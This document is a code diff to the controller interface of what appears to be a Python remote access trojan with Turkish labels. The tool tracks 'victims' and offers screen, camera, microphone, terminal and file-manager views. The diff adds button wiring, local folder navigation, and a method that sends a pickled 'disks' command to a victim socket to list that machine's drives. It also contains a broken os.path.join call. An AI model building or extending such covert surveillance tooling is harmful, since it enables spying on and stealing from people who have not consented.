@@ -19,7 +19,7 @@ from victim import Victim
 
 # types: default, watch_screen, watch_camera, terminal, file_manager, listen_voice
 
-IP ="192.168.1.50"
+IP ="192.168.1.25"
 PORT = 123
 victim_screens = {"watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
 victims = {"client": {}, "watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
@@ -183,7 +183,7 @@ class FileManager(QWidget):
         remoteExecuteButton = QPushButton("Çalıştır")
         remoteRenameButton = QPushButton("Yeniden adlandır")
         uploadButton = QPushButton("Yükle")
-        localBackButton = QPushButton("Geri")
+        localeBackButton = QPushButton("Geri")
         remoteDeleteButton = QPushButton("Sil")
 
         self.bufferEdit.setMinimum(1024)
@@ -192,13 +192,13 @@ class FileManager(QWidget):
         self.bufferEdit.setValue(1024)
         refreshButton.setShortcut(QKeySequence("F5"))
 
-        # refreshButton.clicked.connect(lambda: self.refresh(where="both"))
+        refreshButton.clicked.connect(self.refresh)
         # remoteBackButton.clicked.connect(self.remoteBack)
         # downloadButton.clicked.connect(lambda: Thread(target=self.download).start())
         # remoteExecuteButton.clicked.connect(self.remoteExecute)
         # remoteRenameButton.clicked.connect(self.remoteRename)
         # uploadButton.clicked.connect(lambda: Thread(target=self.upload).start())
-        # localBackButton.clicked.connect(self.localBack)
+        localeBackButton.clicked.connect(self.locale_back)
         # remoteDeleteButton.clicked.connect(self.remoteDelete)
 
         g_lay.addWidget(self.remote_dir_label, 1, 2)
@@ -212,12 +212,13 @@ class FileManager(QWidget):
         g_lay.addWidget(self.locale_dir_label, 1, 1)
         g_lay.addWidget(self.locale_list, 2, 1)
         g_lay.addWidget(uploadButton, 3, 1)
-        g_lay.addWidget(localBackButton, 4, 1)
+        g_lay.addWidget(localeBackButton, 4, 1)
         g_lay.addWidget(refreshButton, 5, 1)
         g_lay.addWidget(self.bufferEdit, 6, 1)
         g_lay.addWidget(self.statusLabel, 7, 1)
 
         self.locale_command("disks")
+        self.remote_command("disks")
 
         # self.executeCommand("disks")
         # self.sendCommand("disks")
@@ -235,6 +236,32 @@ class FileManager(QWidget):
         self.buildGui()
         self.show()
 
+    def refresh(self):
+        if self.locale_dir_label.text() == "":
+            self.locale_command("disks")
+        else:
+            self.locale_command("listdir",path=self.locale_dir_label.text())
+
+        if self.remote_dir_label.text() == "":
+            self.remote_command("disks")
+        else:
+            self.remote_command("listdir",path=self.remote_dir_label.text())
+
+    def remote_command(self,command,**kwargs):
+        if command == "disks":
+            print("remote disks")
+            if not self.victim.send_data(pickle.dumps({"command":"disks"})):
+                self.close()
+            data_length = int(self.victim.client.recv(10).decode("utf-8").lstrip("0"))
+            data = b''
+            while len(data) < data_length:
+                data += self.victim.client.recv(data_length - len(data))
+            data = pickle.loads(data)
+            self.remoteList.clear()
+            for item in data:
+                item_widget = QListWidgetItem(QIcon(self.file_icons["folder"]), item)
+                self.remoteList.addItem(item_widget)
+
     def locale_command(self, command,**kwargs):
         if command == "disks":
             self.locale_list.clear()
@@ -244,10 +271,7 @@ class FileManager(QWidget):
                 item = QListWidgetItem(QIcon(self.file_icons["folder"]), _dir)
                 self.locale_list.addItem(item)
         elif command == "listdir":
-            print("listdir")
             path = kwargs["path"]
-            print("path: "+path)
-            print("listdir: "+str(os.listdir(path)))
             dirs = []
             files = []
             try:
@@ -256,8 +280,6 @@ class FileManager(QWidget):
                         dirs.append(i)
                     else:
                         files.append(i)
-                # dirs = [x for x in os.listdir(path) if os.path.isdir(os.path.join(path, x))]
-                # files = [x for x in os.listdir(path) if os.path.isfile(os.path.join(path, x))]
             except:
                 return
             self.locale_list.clear()
@@ -279,8 +301,6 @@ class FileManager(QWidget):
                 item_text = _file +"\t"+ str(FileManager.convertSizeType(item_size))
                 item = QListWidgetItem(icon, item_text)
                 self.locale_list.addItem(item)
-        elif command == "refresh":
-            pass
 
     def locale_list_item_double_clicked(self):
         selected_text = self.locale_list.selectedItems()[0].text()
@@ -299,6 +319,16 @@ class FileManager(QWidget):
                 os.startfile(path)
             except:
                 pass
+
+    def locale_back(self):
+        if self.locale_dir_label.text() == "":
+            return
+        path = os.path.dirname(self.locale_dir_label.text())
+        if path.count("\\") == 1:
+            self.locale_command("disks")
+        else:
+            self.locale_command("listdir", path=os.path.join(path.split("\\")[0:-1]))
+
     @staticmethod
     def convertSizeType(size: int) -> str:
         if size == -1:
